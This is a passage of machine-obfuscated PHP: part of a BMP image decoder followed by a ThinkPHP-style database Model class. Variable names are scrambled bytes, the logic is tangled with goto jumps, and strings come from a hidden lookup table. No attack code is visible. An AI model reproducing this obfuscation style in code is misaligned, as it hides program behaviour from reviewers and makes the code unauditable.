7; imagesetpixel($Bƒ¹¼¼±‹, $d†ÜÈë“ôÙ, $eÏİ•ƒ‹ªÕ, $b¾ìœÕù«±[($Fí’ÆÏ…Ú & $cÛ”‰šËÅÈ >> $e¾…’¸•¦Ú) >> $EÔëø‰Æğ - $e¾…’¸•¦Ú]); } break; } } } else { for ($E˜Ç‘Å½® = 0; $E˜Ç‘Å½® < $c¥ö²ç¾š; ++$E˜Ç‘Å½®, $eÏİ•ƒ‹ªÕ += $E«¬‘‡±‚©) { $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $Dœé²  Ûß); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } $bæÎà“÷¶ = 0; for ($d†ÜÈë“ôÙ = 0; $d†ÜÈë“ôÙ < $B–äí±­„Ä; ++$d†ÜÈë“ôÙ, $bæÎà“÷¶ += $BøáÒõ“©Ç) { list(, $Fí’ÆÏ…Ú) = unpack($cšºÌï¹ˆ[1867], $eÃËÆ³î‰Ö[$bæÎà“÷¶ >> 3]); $e¾…’¸•¦Ú = $bæÎà“÷¶ & 7; imagesetpixel($Bƒ¹¼¼±‹, $d†ÜÈë“ôÙ, $eÏİ•ƒ‹ªÕ, $b¾ìœÕù«±[($Fí’ÆÏ…Ú & $cÛ”‰šËÅÈ >> $e¾…’¸•¦Ú) >> $EÔëø‰Æğ - $e¾…’¸•¦Ú]); } } } goto F‹Ù“æíÃÕ; F‹Ù“æíÃÕ: } else { goto cËÈ¿Ò§òø; fƒ·ä¹‡Â: $Eì®ŒÅ÷ = $BøáÒõ“©Ç >> 3; $C‚Êöè½·Ä = $DŞ‹¦ ø ? 127 : 0; $Bà¿ ¬Ø½ö = $DŞ‹¦ ø ? 1 / $DŞ‹¦ ø : 1; goto c¢Ö†Ò®ñ; F¯«…Æ™ˆ‘: for ($E˜Ç‘Å½® = 0; $E˜Ç‘Å½® < $c¥ö²ç¾š; ++$E˜Ç‘Å½®, $eÏİ•ƒ‹ªÕ += $E«¬‘‡±‚©) { $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $Dœé²  Ûß); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } $bæÎà“÷¶ = 0; for ($d†ÜÈë“ôÙ = 0; $d†ÜÈë“ôÙ < $B–äí±­„Ä; ++$d†ÜÈë“ôÙ, $bæÎà“÷¶ += $Eì®ŒÅ÷) { list(, $Fí’ÆÏ…Ú) = unpack($cšºÌï¹ˆ[1844], substr($eÃËÆ³î‰Ö, $bæÎà“÷¶, $Eì®ŒÅ÷) . $cšºÌï¹ˆ[1868]); $bÆ¼ô´ñ‡õ = $Fí’ÆÏ…Ú & $DŞ‹¦ ø; $d’éÂïç¡ = $Fí’ÆÏ…Ú & $aêÇ‘–Ò; $e†×Şº˜§ = $Fí’ÆÏ…Ú & $fêÍ™¨‘àÊ; $aÎ’ËİåÊ = $Fí’ÆÏ…Ú & $bĞ‰–óŞßÇ; $bŞ“²ìäº = $C‚Êöè½·Ä - (($bÆ¼ô´ñ‡õ << 7) - $bÆ¼ô´ñ‡õ) * $Bà¿ ¬Ø½ö; $a¯ÚÉğ¡Ï­ = (($d’éÂïç¡ << 8) - $d’éÂïç¡) * $CºÕæŠ½–; $fïÇî‡šÕ = (($e†×Şº˜§ << 8) - $e†×Şº˜§) * $f¥ÚÇ÷¹â¯; $e¾…’¸•¦Ú = (($aÎ’ËİåÊ << 8) - $aÎ’ËİåÊ) * $d–ÓóÛ¸–; imagesetpixel($Bƒ¹¼¼±‹, $d†ÜÈë“ôÙ, $eÏİ•ƒ‹ªÕ, $bŞ“²ìäº << 24 | $a¯ÚÉğ¡Ï­ << 16 | $fïÇî‡šÕ << 8 | $e¾…’¸•¦Ú); } } imagealphablending($Bƒ¹¼¼±‹, !0); goto C¦àà´„¥ö; cËÈ¿Ò§òø: $Bƒ¹¼¼±‹ = imagecreatetruecolor($B–äí±­„Ä, $c¥ö²ç¾š); imagealphablending($Bƒ¹¼¼±‹, !1); if ($DŞ‹¦ ø) { imagesavealpha($Bƒ¹¼¼±‹, !0); } goto fƒ·ä¹‡Â; c¢Ö†Ò®ñ: $CºÕæŠ½– = $aêÇ‘–Ò ? 1 / $aêÇ‘–Ò : 1; $f¥ÚÇ÷¹â¯ = $fêÍ™¨‘àÊ ? 1 / $fêÍ™¨‘àÊ : 1; $d–ÓóÛ¸– = $bĞ‰–óŞßÇ ? 1 / $bĞ‰–óŞßÇ : 1; goto F¯«…Æ™ˆ‘; C¦àà´„¥ö: } return $Bƒ¹¼¼±‹; goto cäˆ¸­ï¯; b¿ÅİÈµ˜É: $cšºÌï¹ˆ =& $_SERVER[‡’¶øåüç˜]; if ($F¦ŞßÕˆ¤°[$cšºÌï¹ˆ[400]] != 19778) { return !1; } $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, 4); goto aªªæ»ù•ï; aªªæ»ù•ï: if ($eÃËÆ³î‰Ö === !1) { return !1; } list(, $cì¡Œ¥åĞ…) = unpack($cšºÌï¹ˆ[1844], $eÃËÆ³î‰Ö); if ($cì¡Œ¥åĞ… == 12) { goto a°®¼òß¼†; B‘¶¦ˆëŒ–: $cÇ¶ğ„è„° = $fÄëÜ«ÕÂæ = $DŞ‹¦ ø = $CÏ¯ë‚ÆÒç = 0; $aêÇ‘–Ò = 16711680; $fêÍ™¨‘àÊ = 65280; goto a¿ÈÜŠÆ¾à; a¿ÈÜŠÆ¾à: $bĞ‰–óŞßÇ = 255; goto BªÜÚù—¼Ï; a°®¼òß¼†: $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $cì¡Œ¥åĞ… - 4); if ($eÃËÆ³î‰Ö === !1) { return !1; } extract(unpack($cšºÌï¹ˆ[1845] . $cšºÌï¹ˆ[1846] . $cšºÌï¹ˆ[1847] . $cšºÌï¹ˆ[1848], $eÃËÆ³î‰Ö)); goto B‘¶¦ˆëŒ–; BªÜÚù—¼Ï: } else { if (124 < $cì¡Œ¥åĞ… || $cì¡Œ¥åĞ… < 40) { return !1; } else { goto cÎ½‰¶Öô; Dù¬­´ëË: if ($e‰ÕÄ¢¯ & 2147483648) { $e‰ÕÄ¢¯ = -(~$e‰ÕÄ¢¯ & 4294967295) - 1; } if ($F¦ŞßÕˆ¤°[$cšºÌï¹ˆ[533]] != 0) { $C²ÔÄ•›¬ = $BøáÒõ“©Ç == 1 || $BøáÒõ“©Ç == 4 || $BøáÒõ“©Ç == 8 ? ($cÇ¶ğ„è„° ? $cÇ¶ğ„è„° : pow(2, $BøáÒõ“©Ç)) << 2 : 0; $bãˆ¢Öğ‡Ÿ = $b¼ßÍµÉ™Ã ? $b¼ßÍµÉ™Ã : ($B–äí±­„Ä * $BøáÒõ“©Ç + 31 >> 3 & ~3) * abs($eÏÇ†¸‡™); $cÓå´ŠßÕ = $F¦ŞßÕˆ¤°[$cšºÌï¹ˆ[533]] - $bãˆ¢Öğ‡Ÿ - $C²ÔÄ•›¬ - 14; if ($cì¡Œ¥åĞ… < $cÓå´ŠßÕ && 40 <= $cì¡Œ¥åĞ… && $cì¡Œ¥åĞ… <= 124) { $cì¡Œ¥åĞ… = $cÓå´ŠßÕ; } } if ($cì¡Œ¥åĞ… - 40 > 0) { $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $cì¡Œ¥åĞ… - 40); if ($eÃËÆ³î‰Ö === !1) { return !1; } extract(unpack($cšºÌï¹ˆ[1858] . $cšºÌï¹ˆ[1859] . $cšºÌï¹ˆ[1860] . $cšºÌï¹ˆ[1861], $eÃËÆ³î‰Ö . str_repeat($cšºÌï¹ˆ[1862], 120))); } else { $DŞ‹¦ ø = $aêÇ‘–Ò = $fêÍ™¨‘àÊ = $bĞ‰–óŞßÇ = 0; } goto EÍ•êŠ¸¾Ò; EÍ•êŠ¸¾Ò: if (($BøáÒõ“©Ç == 16 || $BøáÒõ“©Ç == 24 || $BøáÒõ“©Ç == 32) && $CÏ¯ë‚ÆÒç == 0 && $aêÇ‘–Ò == 0 && $fêÍ™¨‘àÊ == 0 && $bĞ‰–óŞßÇ == 0) { switch ($BøáÒõ“©Ç) { case 16: $aêÇ‘–Ò = 31744; $fêÍ™¨‘àÊ = 992; $bĞ‰–óŞßÇ = 31; break; case 24: case 32: $aêÇ‘–Ò = 16711680; $fêÍ™¨‘àÊ = 65280; $bĞ‰–óŞßÇ = 255; break; } } goto dŠ–·Ô™™; cÎ½‰¶Öô: $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, 36); if ($eÃËÆ³î‰Ö === !1) { return !1; } extract(unpack($cšºÌï¹ˆ[1849] . $cšºÌï¹ˆ[1850] . $cšºÌï¹ˆ[1847] . $cšºÌï¹ˆ[1851] . $cšºÌï¹ˆ[1852] . $cšºÌï¹ˆ[1853] . $cšºÌï¹ˆ[1854] . $cšºÌï¹ˆ[1855] . $cšºÌï¹ˆ[1856] . $cšºÌï¹ˆ[1857], $eÃËÆ³î‰Ö)); goto AÓÌÖ²õæ; AÓÌÖ²õæ: if ($B–äí±­„Ä & 2147483648) { $B–äí±­„Ä = -(~$B–äí±­„Ä & 4294967295) - 1; } if ($eÏÇ†¸‡™ & 2147483648) { $eÏÇ†¸‡™ = -(~$eÏÇ†¸‡™ & 4294967295) - 1; } if ($DÖ²˜‰æÏ¨ & 2147483648) { $DÖ²˜‰æÏ¨ = -(~$DÖ²˜‰æÏ¨ & 4294967295) - 1; } goto Dù¬­´ëË; dŠ–·Ô™™: } } goto aÑ«Íáê÷‘; cäˆ¸­ï¯: } } goto a³Õç†šÌÈ; fÍ£¹ßœÄ: define($_SERVER[‡’¶øåüç˜][234], 0); define($_SERVER[‡’¶øåüç˜][235], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\157\x72\x64\145\x72", "\x61\154\151\141\x73", "\150\141\166\151\x6e\x67", "\x67\x72\157\165\160", "\x6c\157\x63\x6b", "\144\x69\163\x74\x69\156\x63\x74", "\x61\x75\164\157", "\146\151\x6c\164\x65\x72", "\166\141\x6c\x69\x64\141\x74\145", "\x72\145\163\x75\154\164", "\x62\151\156\x64", "\x74\x6f\x6b\x65\156"); public function __construct($B„Ñ‡ÂË˜‰ = '', $E‰Ú©…Û’é = '', $A­º«Š£²Š = '') { $AÓ†¿ºóÜÌ =& $_SERVER[‡’¶øåüç˜]; $this->_initialize(); if (!empty($B„Ñ‡ÂË˜‰)) { if (strpos($B„Ñ‡ÂË˜‰, $AÓ†¿ºóÜÌ[91])) { list($this->dbName, $this->name) = explode($AÓ†¿ºóÜÌ[91], $B„Ñ‡ÂË˜‰); } else { $this->name = $B„Ñ‡ÂË˜‰; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($E‰Ú©…Û’é)) { $this->tablePrefix = $AÓ†¿ºóÜÌ[33]; } elseif ($AÓ†¿ºóÜÌ[33] != $E‰Ú©…Û’é) { $this->tablePrefix = $E‰Ú©…Û’é; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AÓ†¿ºóÜÌ[236]); } $this->db(0, empty($this->connection) ? $A­º«Š£²Š : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $fŠ©Ú„ñÜ =& $_SERVER[‡’¶øåüç˜]; if (empty($this->fields)) { if (think_config($fŠ©Ú„ñÜ[237])) { $Dİ×ÈÄ£…Â = $this->dbName ? $this->dbName : think_config($fŠ©Ú„ñÜ[238]); $EÚ…’œƒ– = think_var_cache($fŠ©Ú„ñÜ[239] . strtolower(get_path_this($Dİ×ÈÄ£…Â) . $fŠ©Ú„ñÜ[91] . $this->name)); if ($EÚ…’œƒ–) { $dÊ¼Ü¼‡ĞŠ = think_config($fŠ©Ú„ñÜ[240]); if (empty($dÊ¼Ü¼‡ĞŠ) || $EÚ…’œƒ–[$fŠ©Ú„ñÜ[241]] == $dÊ¼Ü¼‡ĞŠ) { $this->fields = $EÚ…’œƒ–; return; } } } $this->flush(); } } public function flush() { goto b¤Ô‡µÛ²Œ; cµ¥åùÖËí: if (!$F®…–Š„ß˜) { return !1; } $this->fields = array_keys($F®…–Š„ß˜); $this->fields[$bìƒ¶‹ ëœ[242]] = !1; goto a†³ö‘Õ–; a†³ö‘Õ–: foreach ($F®…–Š„ß˜ as $cÓ—å§»‹î => $BÑÍ…ùæ¿Ó) { $BÓäÌÈ–Š[$cÓ—å§»‹î] = $BÑÍ…ùæ¿Ó[$bìƒ¶‹ ëœ[29]]; if ($BÑÍ…ùæ¿Ó[$bìƒ¶‹ ëœ[36]]) { $this->fields[$bìƒ¶‹ ëœ[243]] = $cÓ—å§»‹î; if ($BÑÍ…ùæ¿Ó[$bìƒ¶‹ ëœ[39]]) { $this->fields[$bìƒ¶‹ ëœ[242]] = !0; } } } $this->fields[$bìƒ¶‹ ëœ[244]] = $BÓäÌÈ–Š; if (think_config($bìƒ¶‹ ëœ[240])) { $this->fields[$bìƒ¶‹ ëœ[241]] = think_config($bìƒ¶‹ ëœ[240]); } goto a…òÏìêºº; b¤Ô‡µÛ²Œ: $bìƒ¶‹ ëœ =& $_SERVER[‡’¶øåüç˜]; $this->db->setModel($this->name); $F®…–Š„ß˜ = $this->db->getFields($this->getTableName()); goto cµ¥åùÖËí; a…òÏìêºº: if (think_config($bìƒ¶‹ ëœ[237])) { $fÉ±ßĞÁÇĞ = $this->dbName ? $this->dbName : think_config($bìƒ¶‹ ëœ[238]); think_var_cache($bìƒ¶‹ ëœ[239] . strtolower(get_path_this($fÉ±ßĞÁÇĞ) . $bìƒ¶‹ ëœ[91] . $this->name), $this->fields); } goto E®Ø¢Ò‹“; E®Ø¢Ò‹“: } public function switchModel($C×ˆåÜ™Êá, $c¦×‰°”ñ = array()) { $BŒ™æÔÎÏó =& $_SERVER[‡’¶øåüç˜]; $D¡±‰†åò = ucwords(strtolower($C×ˆåÜ™Êá)) . $BŒ™æÔÎÏó[245]; if (!class_exists($D¡±‰†åò)) { think_exception($D¡±‰†åò . think_lang($BŒ™æÔÎÏó[246])); } $this->_extModel = new $D¡±‰†åò($this->name); if (!empty($c¦×‰°”ñ)) { foreach ($c¦×‰°”ñ as $F·×ÑË¬´º) { $this->_extModel->setProperty($F·×ÑË¬´º, $this->{$F·×ÑË¬´º}); } } return $this->_extModel; } public function __set($DõÒåá½İ•, $dŞğŒš‘–) { $this->data[$DõÒåá½İ•] = $dŞğŒš‘–; } public function __get($E’İäå×–Ò) { return isset($this->data[$E’İäå×–Ò]) ? $this->data[$E’İäå×–Ò] : null; } public function __isset($Cã’ã°î) { return isset($this->data[$Cã’ã°î]); } public function __unset($d“„¼Õ„¥È) { unset($this->data[$d“„¼Õ„¥È]); } public function __call($a—¼ÉÎğ×³, $A‚“á×’×ë) { $b£Ôæ†áÓ =& $_SERVER[‡’¶øåüç˜]; if (in_array(strtolower($a—¼ÉÎğ×³), $this->methods, !0)) { $this->options[strtolower($a—¼ÉÎğ×³)] = $A‚“á×’×ë[0]; return $this; } elseif (in_array(strtolower($a—¼ÉÎğ×³), array($b£Ôæ†áÓ[247], $b£Ôæ†áÓ[248], $b£Ôæ†áÓ[249], $b£Ôæ†áÓ[250], $b£Ôæ†áÓ[251]), !0)) { $fã¡‹ºÆ = isset($A‚“á×’×ë[0]) ? $A‚“á×’×ë[0] : $b£Ôæ†áÓ[180]; $fã¡‹ºÆ = $this->db->parseKey($fã¡‹ºÆ); return $this->getField(strtoupper($a—¼ÉÎğ×³) . $b£Ôæ†áÓ[252] . $fã¡‹ºÆ . $b£Ôæ†áÓ[253] . $a—¼ÉÎğ×³, $b£Ôæ†áÓ[247]); } elseif (strtolower(substr($a—¼ÉÎğ×³, 0, 5)) == $b£Ôæ†áÓ[254]) { $fã¡‹ºÆ = think_parse_name(substr($a—¼ÉÎğ×³, 5)); $Fî˜‡¨İ×Ã[$fã¡‹ºÆ] = $A‚“á×’×ë[0]; return $this->where($Fî˜‡¨İ×Ã)->find(); } elseif (strtolower(substr($a—¼ÉÎğ×³, 0, 10)) == $b£Ôæ†áÓ[255]) { $a‰Í¶É’“ = think_parse_name(substr($a—¼ÉÎğ×³, 10)); $Fî˜‡¨İ×Ã[$a‰Í¶É’“] = $A‚“á×’×ë[0]; return $this->where($Fî˜‡¨İ×Ã)->getField($A‚“á×’×ë[1]); } elseif (isset($this->_scope[$a—¼ÉÎğ×³])) { return $this->scope($a—¼ÉÎğ×³, $A‚“á×’×ë[0]); } elseif (method_exists($this, $a—¼ÉÎğ×³)) { array_unshift($A‚“á×’×ë, $a—¼ÉÎğ×³); return call_user_func_array(array($this, $b£Ôæ†áÓ[256]), $A‚“á×’×ë); } else { return call_user_func_array(array(parent, $a—¼ÉÎğ×³), $A‚“á×’×ë); } } protected function call() { goto eÄßÒä»Ãã; eÄßÒä»Ãã: $Bªêø ˆ³ì =& $_SERVER[‡’¶øåüç˜]; $cï¬º¤±Ñˆ = func_get_args(); $dŒâ¿Å¼ÆŠ = array_shift($cï¬º¤±Ñˆ); goto BÅ’‘ƒ­ì’; BÅ’‘ƒ­ì’: $C¼¿‹ÆÒƒ = $dŒâ¿Å¼ÆŠ; if (is_array($dŒâ¿Å¼ÆŠ)) { $C¼¿‹ÆÒƒ = $dŒâ¿Å¼ÆŠ[1]; $dŒâ¿Å¼ÆŠ = $dŒâ¿Å¼ÆŠ[0]; } $fíï¶ºµ¨‘ = count($cï¬º¤±Ñˆ) - 1; goto E ßİºÃÛä; a¤ïÊ³ğŞ®: $B©ÁºÌÒ¼ = call_user_func_array(array($this, $dŒâ¿Å¼ÆŠ), $cï¬º¤±Ñˆ); if (method_exists($this, $Bªêø ˆ³ì[260])) { $aˆ·§ßÑª = call_user_func_array(array($this, $Bªêø ˆ³ì[261]), array($C¼¿‹ÆÒƒ, $cï¬º¤±Ñˆ, $B©ÁºÌÒ¼)); if ($aˆ·§ßÑª) { return $aˆ·§ßÑª; } } return $B©ÁºÌÒ¼; goto eîƒ’Â³ˆ; E ßİºÃÛä: if (isset($cï¬º¤±Ñˆ[$fíï¶ºµ¨‘]) && $cï¬º¤±Ñˆ[$fíï¶ºµ¨‘] === $dŒâ¿Å¼ÆŠ) { think_exception(__CLASS__ . $Bªêø ˆ³ì[4] . $dŒâ¿Å¼ÆŠ . think_lang($Bªêø ˆ³ì[257])); return; } $cï¬º¤±Ñˆ[] = $dŒâ¿Å¼ÆŠ; if (method_exists($this, $Bªêø ˆ³ì[258])) { $aˆ·§ßÑª = call_user_func_array(array($this, $Bªêø ˆ³ì[259]), array($C¼¿‹ÆÒƒ, $cï¬º¤±Ñˆ)); if (!is_null($aˆ·§ßÑª) && $aˆ·§ßÑª !== !1) { return $aˆ·§ßÑª; } } goto a¤ïÊ³ğŞ®; eîƒ’Â³ˆ: } protected function _initialize() { } protected function _facade($d¹ƒ“Û£òô) { $DİÑ³‹·ç‘ =& $_SERVER[‡’¶øåüç˜]; if (!empty($this->fields)) { foreach ($d¹ƒ“Û£òô as $cø›ØÔ…² => $BÀØ‚Ø…ŒÌ) { if (!in_array($cø›ØÔ…², $this->fields, !0)) { unset($d¹ƒ“Û£òô[$cø›ØÔ…²]); } elseif (is_scalar($BÀØ‚Ø…ŒÌ)) { $this->_parseType($d¹ƒ“Û£òô, $cø›ØÔ…²); } } } if (!empty($this->options[$DİÑ³‹·ç‘[262]])) { $d¹ƒ“Û£òô = array_map($this->options[$DİÑ³‹·ç‘[262]], $d¹ƒ“Û£òô); unset($this->options[$DİÑ³‹·ç‘[262]]); } $this->_beforeWrite($d¹ƒ“Û£òô); return $d¹ƒ“Û£òô; } protected function _beforeWrite(&$e¥äÈ‚»½´) { } public function add($B×‰¹Àèé = '', $ešÒ‚ÅíÀî = array(), $eË‹é«‚Š© = false) { goto bİ¿º²í§; bİ¿º²í§: if (empty($B×‰¹Àèé)) { if (!empty($this->data)) { $B×‰¹Àèé = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[‡’¶øåüç˜][263]); return !1; } } $ešÒ‚ÅíÀî = $this->_parseOptions($ešÒ‚ÅíÀî); $B×‰¹Àèé = $this->_facade($B×‰¹Àèé); goto B‰Ï²ä‰÷; CÑ§Ÿ»î: return $a ¼„ŒßˆÇ; goto D¡ªŒÔ×…µ; B‰Ï²ä‰÷: if (!1 === $this->_beforeInsert($B×‰¹Àèé, $ešÒ‚ÅíÀî)) { return !1; } $a ¼„ŒßˆÇ = $this->db->insert($B×‰¹Àèé, $ešÒ‚ÅíÀî, $eË‹é«‚Š©); if (!1 !== $a ¼„ŒßˆÇ) { $D¶Ş‚ìì = $this->getLastInsID(); if ($D¶Ş‚ìì) { $B×‰¹Àèé[$this->getPk()] = $D¶Ş‚ìì; $this->_after_insert($B×‰¹Àèé, $ešÒ‚ÅíÀî); return $D¶Ş‚ìì; } $this->_after_insert($B×‰¹Àèé, $ešÒ‚ÅíÀî); } goto CÑ§Ÿ»î; D¡ªŒÔ×…µ: } protected function _beforeInsert(&$f©ì×Š‡Ú©, $aø½Ì’ÁƒÄ) { } protected function _after_insert($AÄ‰´ÉïÔ‡, $føëÉìÙƒç) { } public function addAll($d„—…È†, $C¦ˆ´¹« = array(), $fô‰‚¯ ‘ù = false) { goto F²ŒÂœ¥Ç°; a„˜Š„©: return $aŞĞÍÔô”é; goto BËˆÒ£æ; a‡çª¦‡æ: foreach ($d„—…È† as $E•ª««³Ò° => $F¡¦œºËÙ) { $d„—…È†[$E•ª««³Ò°] = $this->_facade($F¡¦œºËÙ); } if (method_exists($this->db, $cŞ©èÉÄï[264])) { $aŞĞÍÔô”é = $this->db->insertAll($d„—…È†, $C¦ˆ´¹«, $fô‰‚¯ ‘ù); } else { $this->startTrans(); foreach ($d„—…È† as $E•ª««³Ò° => $F¡¦œºËÙ) { $aŞĞÍÔô”é = $this->db->insert($F¡¦œºËÙ, $C¦ˆ´¹«, $fô‰‚¯ ‘ù); } $this->commit(); } if (!1 !== $aŞĞÍÔô”é) { $FÖù„ø‚ë„ = $this->getLastInsID(); if ($FÖù„ø‚ë„) { return $FÖù„ø‚ë„; } } goto a„˜Š„©; F²ŒÂœ¥Ç°: $cŞ©èÉÄï =& $_SERVER[‡’¶øåüç˜]; if (empty($d„—…È†)) { $this->error = think_lang($cŞ©èÉÄï[263]); return !1; } $C¦ˆ´¹« = $this->_parseOptions($C¦ˆ´¹«); goto a‡çª¦‡æ; BËˆÒ£æ: } public function selectAdd($B‹é†ÊÌ• = '', $a¾õŠË¢ì = '', $c¡²ÒÖ™ƒ¯ = array()) { $DõµèÖÄÂù =& $_SERVER[‡’¶øåüç˜]; $c¡²ÒÖ™ƒ¯ = $this->_parseOptions($c¡²ÒÖ™ƒ¯); if (!1 === ($B¡øó©¾½ = $this->db->selectInsert($B‹é†ÊÌ• ? $B‹é†ÊÌ• : $c¡²ÒÖ™ƒ¯[$DõµèÖÄÂù[265]], $a¾õŠË¢ì ? $a¾õŠË¢ì : $this->getTableName(), $c¡²ÒÖ™ƒ¯))) { $this->error = think_lang($DõµèÖÄÂù[266]); return !1; } else { return $B¡øó©¾½; } } public function save($fà®¬ÌÓğ‡ = '', $cÕÖíÊ­ŸÏ = array()) { goto bÄ¦’¡É…é; bÄ¦’¡É…é: $eÃ ï¾İºÊ =& $_SERVER[‡’¶øåüç˜]; if (empty($fà®¬ÌÓğ‡)) { if (!empty($this->data)) { $fà®¬ÌÓğ‡ = $this->data; $this->data = array(); } else { $this->error = think_lang($eÃ ï¾İºÊ[263]); return !1; } } $fà®¬ÌÓğ‡ = $this->_facade($fà®¬ÌÓğ‡); goto Aİ‰½àÑãª; e´×êš×¦á: if (is_array($cÕÖíÊ­ŸÏ[$eÃ ï¾İºÊ[267]]) && isset($cÕÖíÊ­ŸÏ[$eÃ ï¾İºÊ[267]][$D½ÒêˆÑ¼è])) { $B‘„â¡ = $cÕÖíÊ­ŸÏ[$eÃ ï¾İºÊ[267]][$D½ÒêˆÑ¼è]; } if (!1 === $this->_beforeUpdate($fà®¬ÌÓğ‡, $cÕÖíÊ­ŸÏ)) { return !1; } $E¦·¸·ßÀ = $this->db->update($fà®¬ÌÓğ‡, $cÕÖíÊ­ŸÏ); goto A¸óéÅ˜˜ø; A¸óéÅ˜˜ø: if (!1 !== $E¦·¸·ßÀ) { if (isset($B‘„â¡)) { $fà®¬ÌÓğ‡[$D½ÒêˆÑ¼è] = $B‘„â¡; } $this->_afterUpdate($fà®¬ÌÓğ‡, $cÕÖíÊ­ŸÏ); } return $E¦·¸·ßÀ; goto aˆ¤¿Ü§…•; Aİ‰½àÑãª: $cÕÖíÊ­ŸÏ = $this->_parseOptions($cÕÖíÊ­ŸÏ); $D½ÒêˆÑ¼è = $this->getPk(); if (!isset($cÕÖíÊ­ŸÏ[$eÃ ï¾İºÊ[267]])) { if (isset($fà®¬ÌÓğ‡[$D½ÒêˆÑ¼è])) { $dßğÇ©çŒ[$D½ÒêˆÑ¼è] = $fà®¬ÌÓğ‡[$D½ÒêˆÑ¼è]; $cÕÖíÊ­ŸÏ[$eÃ ï¾İºÊ[267]] = $dßğÇ©çŒ; unset($fà®¬ÌÓğ‡[$D½ÒêˆÑ¼è]); } else { $this->error = think_lang($eÃ ï¾İºÊ[266]); return !1; } } goto e´×êš×¦á; aˆ¤¿Ü§…•: } protected function _beforeUpdate(&$E¶¬Íğ©, $EĞ¬‡†È‡ß) { } protected function _afterUpdate($b½¸†Öè¿„, $c„³…°æ®•) { } public function delete($C÷×Èª·‡ˆ = array()) { goto EâùáøÁĞ; fÂ¦º³©Ïâ: if (is_numeric($C÷×Èª·‡ˆ) || is_string($C÷×Èª·‡ˆ)) { if (strpos($C÷×Èª·‡ˆ, $B—ÖÊ‹õ˜§[47])) { $FÚœ•¹ôµ[$Eåçº‡–×] = array($B—ÖÊ‹õ˜§[268], $C÷×Èª·‡ˆ); } else { $FÚœ•¹ôµ[$Eåçº‡–×] = $C÷×Èª·‡ˆ; } $this->options[$B—ÖÊ‹õ˜§[267]] = $FÚœ•¹ôµ; } $C÷×Èª·‡ˆ = $this->_parseOptions(); if (is_array($C÷×Èª·‡ˆ[$B—ÖÊ‹õ˜§[267]]) && isset($C÷×Èª·‡ˆ[$B—ÖÊ‹õ˜§[267]][$Eåçº‡–×])) { $A‰¸í¡“Éğ = $C÷×Èª·‡ˆ[$B—ÖÊ‹õ˜§[267]][$Eåçº‡–×]; } goto dğÁß¢Ö›ï; EâùáøÁĞ: $B—ÖÊ‹õ˜§ =& $_SERVER[‡’¶øåüç˜]; if (empty($C÷×Èª·‡ˆ) && empty($this->options[$B—ÖÊ‹õ˜§[267]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Eåçº‡–× = $this->getPk(); goto fÂ¦º³©Ïâ; dğÁß¢Ö›ï: $f§¯îÃ©° = $this->db->delete($C÷×Èª·‡ˆ); if (!1 !== $f§¯îÃ©°) { $A«‚¥ˆ¤‡ = array(); if (isset($A‰¸í¡“Éğ)) { $A«‚¥ˆ¤‡[$Eåçº‡–×] = $A‰¸í¡“Éğ; } $this->_after_delete($A«‚¥ˆ¤‡, $C÷×Èª·‡ˆ); } return $f§¯îÃ©°; goto a‹é“¼£­İ; a‹é“¼£­İ: } protected function _after_delete($EãÅğõô¬±, $Aó»ÃÍºŞÛ) { } public function select($D©ëğ§•›¶ = array()) { goto EÓİÊ¹²”â; cÜÌâõÉŸ¢: $B’™¾ì¨º = $this->db->select($D©ëğ§•›¶); if (!1 === $B’™¾ì¨º) { return !1; } if (empty($B’™¾ì¨º)) { return null; } goto dÒŸœªÎ²; EÓİÊ¹²”â: $FÌùÊØâ‰« =& $_SERVER[‡’¶øåüç˜]; if (is_string($D©ëğ§•›¶) || is_numeric($D©ëğ§•›¶)) { $eÜï£ê„ = $this->getPk(); if (strpos($D©ëğ§•›¶, $FÌùÊØâ‰«[47])) { $d¹ñŞ°–Ï[$eÜï£ê„] = array($FÌùÊØâ‰«[268], $D©ëğ§•›¶); } else { $d¹ñŞ°–Ï[$eÜï£ê„] = $D©ëğ§•›¶; } $this->options[$FÌùÊØâ‰«[267]] = $d¹ñŞ°–Ï; } elseif (!1 === $D©ëğ§•›¶) { $D©ëğ§•›¶ = $this->_parseOptions(); return $FÌùÊØâ‰«[269] . $this->db->buildSelectSql($D©ëğ§•›¶) . $FÌùÊØâ‰«[270]; } $D©ëğ§•›¶ = $this->_parseOptions(); goto cÜÌâõÉŸ¢; dÒŸœªÎ²: $this->_afterSelect($B’™¾ì¨º, $D©ëğ§•›¶); return $B’™¾ì¨º; goto DÍ¨–ãî‚ª; DÍ¨–ãî‚ª: } protected function _afterSelect(&$F¼±ŠßºÜ, $b×öù©Æò) { } public function buildSql($BİÉ‹‡²Ñ„ = array()) { $EÁˆ„Î á· =& $_SERVER[‡’¶øåüç˜]; $BİÉ‹‡²Ñ„ = $this->_parseOptions($BİÉ‹‡²Ñ„); return $EÁˆ„Î á·[269] . $this->db->buildSelectSql($BİÉ‹‡²Ñ„) . $EÁˆ„Î á·[270]; } public function optionsValue($C¤£ÍÛá¼… = null) { if (is_null($C¤£ÍÛá¼…)) { return $this->options; } elseif (is_array($C¤£ÍÛá¼…)) { $this->options = array_merge($this->options, $C¤£ÍÛá¼…); } } protected function _parseOptions($E¿œœß ˆ÷ = array()) { goto Cì©¯©š”å; 